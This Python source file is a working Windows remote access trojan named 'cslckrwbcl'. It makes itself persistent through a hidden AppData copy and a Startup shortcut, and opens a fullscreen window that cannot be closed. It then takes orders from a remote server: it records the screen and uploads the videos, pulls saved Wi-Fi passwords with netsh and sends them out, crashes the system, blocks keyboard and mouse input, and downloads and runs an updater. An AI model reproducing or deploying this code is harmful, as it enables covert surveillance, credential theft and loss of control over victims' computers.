from numpy import array
import os, sys, bsod, time, socket, ctypes, shutil, webview, requests, threading, subprocess, imageio, pyautogui, time

exe = sys.executable
computer_name = socket.gethostname()
appdata_roaming = os.environ.get('APPDATA')
destination = os.path.join(appdata_roaming, '.cslckrwbcl')
destination_exe = os.path.join(destination, 'cslckrwbcl.exe')
screen_recordings_dir = os.path.join(destination, "screen_recordings")
startup_shortcut_path = os.path.join(appdata_roaming, "Microsoft/Windows/Start Menu/Programs/Startup/cslckrwbcl.lnk")

def create_shortcut():
    os.makedirs(destination, exist_ok=True)
    os.makedirs(screen_recordings_dir, exist_ok=True)
    if os.path.abspath(exe) != os.path.abspath(destination_exe) and not os.path.exists(destination_exe):
        shutil.copy2(exe, destination_exe)
        subprocess.Popen([destination_exe], shell=False)
        os._exit(0)

        ctypes.windll.kernel32.SetFileAttributesW(destination, 0x02)

    ps = f"""
        $s=(New-Object -Com Object WScript.Shell).CreateShortcut('{startup_shortcut_path}');
        $s.TargetPath='{destination_exe}';
        $s.Save()
    """
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", ps], creationflags=0x08000000)
create_shortcut()

def on_closing():
    return False

if __name__ == "__main__":
    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'computer_name': computer_name})
    window = webview.create_window(f"cslckrwbcl", "https://cslckrwbcl.lrdevstudio.com", frameless=True, resizable=False, fullscreen=True, draggable=False, zoomable=False)
    window.events.closing += on_closing
    def check_commands():
        time.sleep(1)
        print("Checking...")
        try:
            response = requests.get('https://cslckrwbcl.lrdevstudio.com/messages')
            data = response.json()
            if data != [] and data != None:
                wbdata = data[0]
                action = wbdata.get('action')
                timestamp = wbdata.get('time')
                duration = wbdata.get('duration')

                if action == f'record-{computer_name}':
                    record_path = os.path.join(screen_recordings_dir, f"screen-recording-{computer_name}-{timestamp}.mp4")

                    fps = 20 
                    duration_sec = duration
                    total_frames = fps * duration_sec
                    writer = imageio.get_writer(record_path, fps=fps, codec='libx264', ffmpeg_params=['-movflags', 'faststart'])

                    for i in range(total_frames):
                        img = pyautogui.screenshot()
                        frame = array(img)
                        writer.append_data(frame)
                        time.sleep(1/fps)

                    writer.close()

                    with open(record_path, 'rb') as f:
                        files = {'video': f}
                        data = {'filename': os.path.basename(record_path)}
                        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', files=files, data=data)
                elif action == f'delete-video':
                    shutil.rmtree(screen_recordings_dir)
                    os.makedirs(screen_recordings_dir)
                elif action == f'network-passwords-{computer_name}':
                    networks = []
                    profiles_output = subprocess.check_output((["netsh", "wlan", "show", "profiles"])).decode(errors="ignore")
                    profiles = []

                    for line in profiles_output.splitlines():
                        if "All User Profile" in line:
                            profiles.append(line.split(":")[1].strip())

                    for name in profiles:
                        profile_output = subprocess.check_output(["netsh", "wlan", "show", "profile", name, "key=clear"]).decode(errors="ignore")
                        for line in profile_output.splitlines():
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                break
                        networks.append([name, password])
                    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={f'all-network-passwords-{computer_name}': networks})
                elif action == f'bsod-{computer_name}':
                    bsod()
                elif action == f'jumpscare-{computer_name}':
                    count = 0
                    while count != int(data[0].get('data')):
                        webview.create_window(f"({count}) cslckrwbcl", "https://cslckrwbcl.lrdevstudio.com/flash", frameless=True, resizable=False, fullscreen=True, draggable=False, zoomable=False)
                        count += 1
                elif action == f'blockinput-{computer_name}':
                    bsod.block_keyboard()
                    bsod.block_mouse()
                elif action == f'hidewbcl-{computer_name}':
                    window.hide()
                    window.load_url('https://cslckrwbcl.lrdevstudio.com/neutral')
                elif action == f'updatewbcl-{computer_name}':
                    updater_url = "https://github.com/raedhashmi/cslckrwbcl/raw/refs/heads/main/output/updater/cslckrwbcl%20updater.exe"

                    updater_exe = os.path.join(destination, "cslckrwbcl updater.exe")

                    response = requests.get(updater_url, stream=True, timeout=30)
                    response.raise_for_status()

                    with open(updater_exe, "wb") as f:
                        for chunk in response.iter_content(8192):
                            if chunk:
                                f.write(chunk)

                    subprocess.Popen([updater_exe, "update"], shell=False)
                    os._exit(0)
                elif "computer_name" not in data[0]:
                    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json=data[0])
        except Exception as e:
            print("Error fetching commands:", e)
        check_commands()
    thread = threading.Thread(target=check_commands, daemon=True)
    thread.start()
    webview.start()